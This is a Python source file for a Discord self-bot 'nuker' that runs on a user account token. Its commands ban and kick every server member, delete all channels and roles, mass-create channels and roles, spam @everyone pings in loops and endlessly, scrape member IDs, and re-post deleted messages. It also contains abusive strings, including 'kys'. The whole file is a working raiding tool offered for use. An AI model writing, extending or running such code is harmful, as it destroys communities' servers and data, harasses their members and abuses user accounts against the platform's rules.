import discord
from discord.ext import commands
from colorama import Fore, Style
from threading import Thread
import asyncio
import json
import os

red = Fore.RED
green = Fore.GREEN
blue = Fore.BLUE
reset = Fore.RESET
magenta = Fore.MAGENTA
cyan = Fore.CYAN

os.system("pip install discord.py==1.4")

with open("config.json") as f:
  j = json.load(f)
token = j["token"]
prefix = j["prefix"]

client = commands.Bot(command_prefix=prefix, self_bot=True)

client.remove_command("help")

@client.event
async def on_connect():
  print(red + f"""
  
  
  
  
  
  
  
  
  
  
{red}=====|==========================|=====
         ╔╦╗╦╔═╗╔╦╗╔═╗╔╗╔╔╦╗
          {blue}║║║╚═╗ ║ ╠═╣║║║ ║ 
         {red}═╩╝╩╚═╝ ╩ ╩ ╩╝╚╝ ╩ 

{cyan}       Logged In As: {client.user.name}#{client.user.discriminator}
            
{red}=====|==========================|=====              """ + reset)
  print(red + f"""
{prefix}ban            | {cyan}Bans All Server Members\n{red}{prefix}kick           | {cyan}Kicks All Server Members\n{red}{prefix}schan [name]   | {cyan}Spams Channels With The Desired Name\n{red}{prefix}sroles [name]  | {cyan}Spams Roles With The Desired Name\n{red}{prefix}dchan          | {cyan}Deletes All Server Channels\n{red}{prefix}droles         | {cyan}Deleted All Server Roles\n{red}{prefix}ping [content] | {cyan}Spams Pings With The Desired Content\n{red}{prefix}roles          | {cyan}Prints All The Servers Roles\n{red}{prefix}snipe          | {cyan}Snipes The Last Deleted Message\n{red}{prefix}spam [content] | {cyan}Spams The Desired Content\n{red}{prefix}leave          | {cyan}Leaves The Guild

{red}=====|==========================|=====""")
  
@client.command()
async def ban(ctx):
  await ctx.message.delete()
  for member in ctx.guild.members:
    try:
      await member.ban(reason="Distant Nuker | <3")
      print(f"{reset}[{green}+{reset}] Banned {member}")
    except:
      print(f"{reset}[{red}-{reset}] Couldn't Ban {member}")
      continue
    
@client.command()
async def kick(ctx):
  await ctx.message.delete()
  for member in ctx.guild.members:
    try:
      await member.kick(reason="Get Fucked | <3")
      print(f"{reset}[{green}+{reset}] Kicked {member}")
    except:
      print(f"{reset}[{red}-{reset}] Can't Kick {member}")
      continue
    
@client.command()
async def schan(ctx, *, x):
  await ctx.message.delete()
  for i in range(100):
    await ctx.guild.create_text_channel(name=x)
    
@client.command()
async def sroles(ctx, *, x):
  await ctx.message.delete()
  for i in range(100):
    await ctx.guild.create_role(name=x)
    
@client.command()
async def ping(ctx, *, x):
  await ctx.message.delete()
  for channel in ctx.guild.channels:
    try:
      for i in range(100):
        await ctx.send(f"@everyone {x}")
    except:
      continue
    
@client.command()
async def roles(ctx):
  await ctx.message.delete()
  print(reset + f"Server Roles: {len(ctx.guild.roles)}")
  for role in ctx.guild.roles:
    try:
      print(reset + f"{role}")
    except:
      continue
    
@client.command()
async def scrape(ctx):
  await ctx.message.delete()
  for member in ctx.guild.members:
    try:
      with open("ids.txt", "w") as f:
        f.write(f"{member.id}")
    except:
      continue
    
@client.event
async def on_message_delete(message):
  global m_c
  global m_a
  m_c = message.content
  m_a = message.author
  
@client.command()
async def snipe(ctx):
  if m_c == None:
    await ctx.send("kys")
  else:
    await ctx.send(f"`{m_a}:` {m_c}")
    
@client.command()
async def spam(ctx, *, x):
  await ctx.message.delete()
  while True:
    await ctx.send(x)
    
@client.command()
async def dchan(ctx):
  await ctx.message.delete()
  for channel in ctx.guild.channels:
    try:
      await channel.delete()
      print(f"{reset}[{green}+{reset}] Deleted {channel}")
    except:
      print(f"{reset}[{red}-{reset}] Couldn't Delete {channel}")
      continue
    
@client.command()
async def droles(ctx):
  await ctx.message.delete()
  for role in ctx.guild.roles:
    try:
      await role.delete()
      print(f"{reset}[{green}+{reset}] Deleted {role}")
    except:
      print(f"{reset}[{red}-{reset}] Couldn't Delete {role}")
      continue
    
@client.command()
async def leave(ctx):
  await ctx.message.delete()
  await ctx.guild.leave()
  
client.run(token, bot=False)
